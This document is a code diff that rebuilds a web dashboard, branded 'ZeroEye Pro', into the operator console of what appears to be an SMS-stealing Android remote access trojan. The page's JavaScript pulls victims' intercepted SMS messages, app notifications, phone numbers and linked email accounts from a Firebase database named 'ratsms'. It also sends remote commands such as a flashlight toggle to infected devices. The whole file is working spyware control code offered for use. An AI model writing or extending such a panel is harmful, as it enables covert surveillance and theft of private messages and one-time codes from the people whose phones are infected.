@@ -1,158 +1,612 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS Monitor Dashboard</title>
-    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <title>ZeroEye Pro | Security Dashboard</title>
+    <!-- FontAwesome for Pro Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #f3f4f6; font-family: sans-serif; }
+        :root {
+            --primary: #6366f1;
+            --primary-hover: #4f46e5;
+            --primary-light: #eef2ff;
+            --bg: #f8fafc;
+            --card: #ffffff;
+            --text-main: #0f172a;
+            --text-sub: #64748b;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --border: #e2e8f0;
+            --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -4px rgba(0, 0, 0, 0.1);
+        }
+
+        * { box-sizing: border-box; }
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: var(--bg); 
+            color: var(--text-main); 
+            margin: 0; 
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        /* Layout */
+        .navbar {
+            background: var(--card);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .navbar h1 {
+            margin: 0;
+            font-size: 1.25rem;
+            font-weight: 800;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .main-content {
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        /* Auth Screen */
+        .auth-container {
+            max-width: 450px;
+            margin: 80px auto;
+            background: var(--card);
+            padding: 40px;
+            border-radius: 24px;
+            box-shadow: var(--shadow);
+            text-align: center;
+        }
+
+        .auth-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--primary-light);
+            color: var(--primary);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin: 0 auto 24px;
+        }
+
+        .auth-container h2 { font-weight: 800; margin-bottom: 12px; }
+        .auth-container p { color: var(--text-sub); margin-bottom: 32px; font-size: 0.95rem; }
+
+        .input-box {
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .input-box i {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-sub);
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 14px 14px 48px;
+            border: 2px solid var(--border);
+            border-radius: 14px;
+            font-size: 1rem;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 4px var(--primary-light); }
+
+        .btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 14px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s;
+        }
+
+        .btn:hover { background: var(--primary-hover); transform: translateY(-2px); }
+        .btn:active { transform: translateY(0); }
+
+        /* Device List */
+        .grid-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .grid-header h2 { font-weight: 800; font-size: 1.5rem; margin: 0; }
+
+        .device-card {
+            background: var(--card);
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            cursor: pointer;
+            border: 1px solid var(--border);
+            transition: all 0.3s;
+        }
+
+        .device-card:hover { border-color: var(--primary); transform: scale(1.01); box-shadow: var(--shadow); }
+
+        .dev-avatar {
+            width: 56px;
+            height: 56px;
+            background: #f1f5f9;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-sub);
+            font-size: 24px;
+        }
+
+        .dev-meta { flex: 1; }
+        .dev-meta .name { font-weight: 700; font-size: 1.1rem; margin-bottom: 4px; }
+        .dev-meta .id { font-size: 0.85rem; color: var(--text-sub); font-family: monospace; }
+
+        .badge {
+            padding: 6px 12px;
+            border-radius: 10px;
+            font-size: 0.7rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .badge-online { background: #dcfce7; color: var(--success); }
+        .badge-offline { background: #fee2e2; color: var(--danger); }
+
+        /* Details View */
+        .detail-top {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 32px;
+        }
+
+        .back-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--card);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border: 1px solid var(--border);
+            transition: all 0.2s;
+        }
+
+        .back-circle:hover { background: var(--bg); color: var(--primary); }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+            margin-bottom: 32px;
+        }
+
+        .stat-item {
+            background: var(--card);
+            padding: 24px;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .stat-item i { font-size: 20px; color: var(--primary); margin-bottom: 12px; }
+        .stat-item label { display: block; font-size: 0.75rem; font-weight: 700; color: var(--text-sub); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
+        .stat-item span { font-weight: 700; font-size: 1rem; word-break: break-all; }
+
+        .control-panel {
+            background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
+            padding: 30px;
+            border-radius: 24px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+            box-shadow: 0 10px 20px -5px rgba(99, 102, 241, 0.4);
+        }
+
+        .control-panel h3 { margin: 0; font-size: 1.1rem; display: flex; align-items: center; gap: 12px; }
+        .btn-toggle {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            backdrop-filter: blur(4px);
+        }
+
+        .btn-toggle.active { background: white; color: var(--primary); }
+
+        .tabs {
+            display: flex;
+            background: #e2e8f0;
+            padding: 6px;
+            border-radius: 16px;
+            margin-bottom: 24px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 12px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            border-radius: 12px;
+            transition: all 0.2s;
+        }
+
+        .tab.active { background: var(--card); color: var(--primary); box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); }
+
+        .log-card {
+            background: var(--card);
+            border-radius: 18px;
+            padding: 20px;
+            margin-bottom: 12px;
+            border: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .log-card .meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--text-sub);
+        }
+
+        .log-card .content { font-size: 0.95rem; line-height: 1.5; color: var(--text-main); }
+        .log-card .app-name { color: var(--primary); text-transform: uppercase; font-size: 0.7rem; font-weight: 800; }
+
+        /* List style for details */
+        .data-list-simple {
+            margin-top: 10px;
+        }
+        .data-item {
+            background: #f1f5f9;
+            padding: 8px 12px;
+            border-radius: 8px;
+            margin-bottom: 6px;
+            font-size: 0.9rem;
+            font-family: monospace;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .hidden { display: none; }
+        #loader { text-align: center; padding: 40px; }
+
+        @media (max-width: 600px) {
+            .main-content { padding: 0 15px; margin: 20px auto; }
+            .stats-grid { grid-template-columns: 1fr; }
+            .control-panel { flex-direction: column; text-align: center; gap: 20px; }
+        }
     </style>
 </head>
 <body>
 
-    <div id="remote-lock-section" class="fixed inset-0 bg-gray-100 flex flex-col items-center justify-center p-4 z-50 hidden">
-        <div class="bg-white p-8 rounded-3xl shadow-lg w-full max-w-md text-center">
-            <div class="w-16 h-16 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl font-bold">🔒</div>
-            <h2 class="text-2xl font-black text-gray-800 mb-2 tracking-tight">Dashboard Locked</h2>
-            <p class="text-sm text-gray-400">The administrator has temporarily deactivated the system from the control domain.</p>
+    <nav class="navbar">
+        <h1><i class="fas fa-eye"></i> ZEROEYE PRO</h1>
+        <div id="nav-user" class="hidden" style="font-size: 0.8rem; font-weight: 600; color: var(--text-sub);">
+            KEY: <span id="display-key" style="color: var(--primary)"></span>
+        </div>
+    </nav>
+
+    <div class="main-content">
+        <!-- AUTH SCREEN -->
+        <section id="auth-screen" class="auth-container">
+            <div class="auth-icon"><i class="fas fa-fingerprint"></i></div>
+            <h2>Secure Protocol</h2>
+            <p>Authentication required to access intercept nodes.</p>
+            <div class="input-box">
+                <i class="fas fa-vault"></i>
+                <input type="password" id="master-key" placeholder="Enter Access Key">
+            </div>
+            <button class="btn" onclick="authenticate()">INITIALIZE LINK</button>
+        </section>
+
+        <!-- DASHBOARD GRID -->
+        <section id="dashboard-screen" class="hidden">
+            <div class="grid-header">
+                <h2>Active Nodes</h2>
+                <button class="btn" onclick="fetchData()" style="width: auto; padding: 10px 20px; font-size: 14px;">
+                    <i class="fas fa-sync-alt"></i> REFRESH
+                </button>
+            </div>
+            <div id="device-list"></div>
+        </section>
+
+        <!-- DEVICE DETAIL -->
+        <section id="detail-screen" class="hidden">
+            <div class="detail-top">
+                <div class="back-circle" onclick="goBack()"><i class="fas fa-arrow-left"></i></div>
+                <h2 id="node-name" style="margin:0; font-weight: 800;">Node Details</h2>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <i class="fas fa-bolt"></i>
+                    <label>Power Level</label>
+                    <span id="node-batt">--%</span>
+                </div>
+                <div class="stat-item">
+                    <i class="fas fa-satellite-dish"></i>
+                    <label>Connection</label>
+                    <span id="node-status">--</span>
+                </div>
+            </div>
+
+            <div class="stats-grid" style="grid-template-columns: 1fr;">
+                <div class="stat-item" style="text-align: left;">
+                    <i class="fas fa-sim-card"></i>
+                    <label>Assigned SIMs</label>
+                    <div id="node-phone" class="data-list-simple">Detecting...</div>
+                </div>
+                <div class="stat-item" style="text-align: left;">
+                    <i class="fas fa-at"></i>
+                    <label>Linked Accounts</label>
+                    <div id="node-emails" class="data-list-simple">Detecting...</div>
+                </div>
+            </div>
+
+            <div class="control-panel">
+                <h3><i class="fas fa-flashlight"></i> REMOTE FLASHLIGHT</h3>
+                <div style="display: flex; gap: 12px;">
+                    <button class="btn-toggle" id="torch-on" onclick="sendCmd('on')">ON</button>
+                    <button class="btn-toggle" id="torch-off" onclick="sendCmd('off')">OFF</button>
+                </div>
+            </div>
+
+            <div class="tabs">
+                <div class="tab active" id="tab-sms" onclick="switchTab('sms')">SMS INTERCEPT</div>
+                <div class="tab" id="tab-notif" onclick="switchTab('notif')">NOTIFICATIONS</div>
+            </div>
+
+            <div id="log-list"></div>
+        </section>
+
+        <div id="loader" class="hidden">
+            <div class="loader"></div>
+            <p style="margin-top: 10px; font-size: 0.8rem; font-weight: 600; color: var(--text-sub);">SYNCING DATA...</p>
         </div>
     </div>
-
-    <div id="main-content" class="max-w-4xl mx-auto p-4 md:p-8">
-        
-        <div class="flex justify-between items-center bg-white p-6 rounded-2xl shadow-sm mb-6">
-            <div>
-                <h1 class="text-2xl font-bold text-gray-850">SMS Monitor Dashboard</h1>
-                <p class="text-sm text-gray-500">Real-time upcoming messages tracking</p>
-            </div>
-            <div class="flex items-center space-x-2">
-                <span class="relative flex h-3 w-3">
-                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
-                  <span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
-                </span>
-                <span class="text-sm font-medium text-green-6xl">Live Stream</span>
-            </div>
-        </div>
-
-        <div id="loader" class="text-center py-10">
-            <p class="text-gray-500 animate-pulse">Checking remote system status...</p>
-        </div>
-
-        <div id="messages-container" class="space-y-4 hidden"></div>
-
-        <div id="no-messages" class="hidden text-center bg-white p-12 rounded-2xl shadow-sm text-gray-400">
-            No messages captured yet. Send a test SMS to check.
-        </div>
-    </div>
-
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
 
     <script>
-        // Firebase Configuration
-        const firebaseConfig = {
-            databaseURL: "https://ratsms-d15e7-default-rtdb.firebaseio.com" 
-        };
+        const DB_BASE = "https://ratsms-d15e7-default-rtdb.firebaseio.com/";
+        let accessKey = "";
+        let activeDevId = "";
+        let syncTimer = null;
+        let currentTab = "sms";
 
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-        
-        let messagesListenerRef = null; // Messages listener handler
-
-        // DOM Elements
-        const remoteLockSection = document.getElementById('remote-lock-section');
-        const mainContent = document.getElementById('main-content');
-        const messagesContainer = document.getElementById('messages-container');
-        const loader = document.getElementById('loader');
-        const noMessages = document.getElementById('no-messages');
-
-        // STEP 1: Dusre domain ke switch status ko lagatar monitor karna
-        database.ref('system_control/status').on('value', (statusSnapshot) => {
-            const isSystemOn = statusSnapshot.val();
-
-            if (isSystemOn === true) {
-                // Agar dusre domain se ON hai -> Lock screen hatao aur data stream chalu karo
-                remoteLockSection.classList.add('hidden');
-                mainContent.classList.remove('hidden');
-                
-                // Messages stream start karein (agar pehle se chalu nahi hai)
-                if (!messagesListenerRef) {
-                    startListeningToMessages();
-                }
-            } else {
-                // Agar dusre domain se OFF kar diya -> Instant data block aur lock screen show karo
-                stopListeningAndClearData();
-                
-                remoteLockSection.classList.remove('hidden');
-                mainContent.classList.add('hidden');
-            }
-        });
-
-        // STEP 2: Realtime Messages Load karne ka function
-        function startListeningToMessages() {
-            messagesListenerRef = database.ref('messages');
+        function authenticate() {
+            accessKey = document.getElementById('master-key').value.trim();
+            if(!accessKey) return;
             
-            messagesListenerRef.on('value', (snapshot) => {
-                loader.style.display = 'none';
-                messagesContainer.innerHTML = ''; // Clear existing lists
+            document.getElementById('display-key').innerText = accessKey;
+            fetchData(true);
+        }
 
-                if (snapshot.exists()) {
-                    messagesContainer.classList.remove('hidden');
-                    noMessages.classList.add('hidden');
-
-                    const data = snapshot.val();
-                    const messagesList = Object.keys(data).map(key => ({
-                        id: key,
-                        ...data[key]
-                    }));
-
-                    // Latest First Sorting
-                    messagesList.sort((a, b) => b.timestamp - a.timestamp);
-
-                    messagesList.forEach((sms) => {
-                        const smsDate = new Date(sms.timestamp).toLocaleString('en-IN', {
-                            timeZone: 'Asia/Kolkata',
-                            dateStyle: 'medium',
-                            timeStyle: 'short'
-                        });
-
-                        const cardHtml = `
-                            <div class="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 hover:shadow-md transition-shadow">
-                                <div class="flex justify-between items-start mb-3">
-                                    <span class="bg-blue-50 text-blue-600 font-semibold px-3 py-1 rounded-full text-sm">
-                                        ${sms.sender}
-                                    </span>
-                                    <span class="text-xs text-gray-400 font-medium">
-                                        ${smsDate}
-                                    </span>
-                                </div>
-                                <p class="text-gray-700 whitespace-pre-wrap break-words text-sm md:text-base">
-                                    ${sms.message}
-                                </p>
-                            </div>
-                        `;
-                        messagesContainer.innerHTML += cardHtml;
-                    });
-
-                } else {
-                    messagesContainer.classList.add('hidden');
-                    noMessages.classList.remove('hidden');
+        function fetchData(firstLoad = false) {
+            // Check Global Lock First
+            fetch(DB_BASE + "global/locked.json")
+            .then(res => res.json())
+            .then(locked => {
+                if(locked) {
+                    document.body.innerHTML = `
+                        <div style="text-align:center; padding:100px; color:#ef4444;">
+                            <i class="fas fa-lock" style="font-size:64px; margin-bottom:20px;"></i>
+                            <h1>System Locked</h1>
+                            <p>Administrative access is disabled globally.</p>
+                        </div>`;
+                    return;
                 }
+
+                if(firstLoad) document.getElementById('loader').classList.remove('hidden');
+                
+                fetch(`${DB_BASE}${accessKey}.json`)
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('loader').classList.add('hidden');
+                    if(!data) { 
+                        if(firstLoad) alert("Invalid Key or No Data Found."); 
+                        return; 
+                    }
+                    
+                    if(firstLoad) {
+                        document.getElementById('auth-screen').classList.add('hidden');
+                        document.getElementById('dashboard-screen').classList.remove('hidden');
+                        document.getElementById('nav-user').classList.remove('hidden');
+                        
+                        if(syncTimer) clearInterval(syncTimer);
+                        syncTimer = setInterval(fetchData, 10000);
+                    }
+
+                    if(activeDevId) {
+                        updateDetailUI(activeDevId, data[activeDevId]);
+                    } else {
+                        renderDeviceList(data);
+                    }
+                })
+                .catch(err => {
+                    console.error(err);
+                    document.getElementById('loader').classList.add('hidden');
+                });
             });
         }
 
-        // STEP 3: Connection disconnect karne aur screen saaf karne ka function
-        function stopListeningAndClearData() {
-            if (messagesListenerRef) {
-                messagesListenerRef.off(); // Firebase data pipeline cut off
-                messagesListenerRef = null;
+        function renderDeviceList(data) {
+            const container = document.getElementById('device-list');
+            container.innerHTML = "";
+            
+            for(let id in data) {
+                const info = data[id].info || {};
+                const isOnline = (Date.now() - (info.lastSeen || 0)) < 120000;
+                
+                const card = document.createElement('div');
+                card.className = "device-card";
+                card.onclick = () => openDetails(id, data[id]);
+                card.innerHTML = `
+                    <div class="dev-avatar"><i class="fas fa-microchip"></i></div>
+                    <div class="dev-meta">
+                        <div class="name">${info.deviceName || 'Unknown Node'}</div>
+                        <div class="id">NODE_${id.substring(0,8)}</div>
+                    </div>
+                    <div class="badge ${isOnline ? 'badge-online' : 'badge-offline'}">
+                        ${isOnline ? 'Active' : 'Offline'}
+                    </div>
+                `;
+                container.appendChild(card);
             }
-            messagesContainer.innerHTML = ''; // Saare purane messages ui se delete
-            messagesContainer.classList.add('hidden');
-            loader.style.display = 'block';
+        }
+
+        function openDetails(id, device) {
+            activeDevId = id;
+            document.getElementById('dashboard-screen').classList.add('hidden');
+            document.getElementById('detail-screen').classList.remove('hidden');
+            updateDetailUI(id, device);
+        }
+
+        function updateDetailUI(id, device) {
+            const info = device.info || {};
+            document.getElementById('node-name').innerText = info.deviceName || id;
+            document.getElementById('node-batt').innerText = (info.battery || 0) + "%";
+            
+            const isOnline = (Date.now() - (info.lastSeen || 0)) < 120000;
+            const statusEl = document.getElementById('node-status');
+            statusEl.innerText = isOnline ? 'LINKED' : 'TIMEOUT';
+            statusEl.style.color = isOnline ? 'var(--success)' : 'var(--danger)';
+            
+            // Format Phone Numbers
+            const phoneList = document.getElementById('node-phone');
+            phoneList.innerHTML = "";
+            const phones = (info.phoneNumber || "").split(",").filter(p => p.trim());
+            if(phones.length > 0) {
+                phones.forEach(p => {
+                    phoneList.innerHTML += `<div class="data-item"><i class="fas fa-phone-alt" style="color:var(--primary);"></i>${p.trim()}</div>`;
+                });
+            } else {
+                phoneList.innerHTML = `<div class="data-item">Not Detected</div>`;
+            }
+
+            // Format Emails
+            const emailList = document.getElementById('node-emails');
+            emailList.innerHTML = "";
+            const emails = (info.emails || "").split(",").filter(e => e.trim());
+            if(emails.length > 0) {
+                emails.forEach(e => {
+                    emailList.innerHTML += `<div class="data-item"><i class="fas fa-envelope" style="color:var(--primary);"></i>${e.trim()}</div>`;
+                });
+            } else {
+                emailList.innerHTML = `<div class="data-item">None Found</div>`;
+            }
+
+            renderLogs(device);
+        }
+
+        function renderLogs(device) {
+            const container = document.getElementById('log-list');
+            container.innerHTML = "";
+            
+            const logs = device[currentTab === 'sms' ? 'messages' : 'notifications'] || {};
+            const sorted = Object.values(logs).sort((a,b) => b.timestamp - a.timestamp);
+            
+            if(sorted.length === 0) {
+                container.innerHTML = `<div style="text-align:center; padding:40px; color:var(--text-sub);">
+                    <i class="fas fa-folder-open" style="font-size:30px; margin-bottom:10px; opacity:0.3;"></i>
+                    <p>No transmission logs on this channel.</p>
+                </div>`;
+                return;
+            }
+
+            sorted.forEach(item => {
+                const card = document.createElement('div');
+                card.className = "log-card";
+                const time = new Date(item.timestamp).toLocaleString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+                
+                if(currentTab === 'sms') {
+                    card.innerHTML = `
+                        <div class="meta">
+                            <span><i class="fas fa-user-secret"></i> ${item.sender}</span>
+                            <span>${time}</span>
+                        </div>
+                        <div class="content">${item.message}</div>
+                    `;
+                } else {
+                    const app = item.app.split('.').pop().toUpperCase();
+                    card.innerHTML = `
+                        <div class="meta">
+                            <span class="app-name">${app}</span>
+                            <span>${time}</span>
+                        </div>
+                        <div class="content"><strong>${item.title}</strong><br>${item.content}</div>
+                    `;
+                }
+                container.appendChild(card);
+            });
+        }
+
+        function switchTab(type) {
+            currentTab = type;
+            document.getElementById('tab-sms').classList.remove('active');
+            document.getElementById('tab-notif').classList.remove('active');
+            document.getElementById('tab-' + type).classList.add('active');
+            fetchData();
+        }
+
+        function sendCmd(val) {
+            if(!accessKey || !activeDevId) return;
+            fetch(`${DB_BASE}${accessKey}/${activeDevId}/commands.json`, {
+                method: 'PUT',
+                body: JSON.stringify({torch: val})
+            }).then(() => {
+                document.getElementById('torch-on').classList.toggle('active', val === 'on');
+                document.getElementById('torch-off').classList.toggle('active', val === 'off');
+                alert(`Command Sent: Flashlight ${val.toUpperCase()}`);
+            });
+        }
+
+        function goBack() {
+            activeDevId = "";
+            document.getElementById('detail-screen').classList.add('hidden');
+            document.getElementById('dashboard-screen').classList.remove('hidden');
         }
     </script>
 </body>
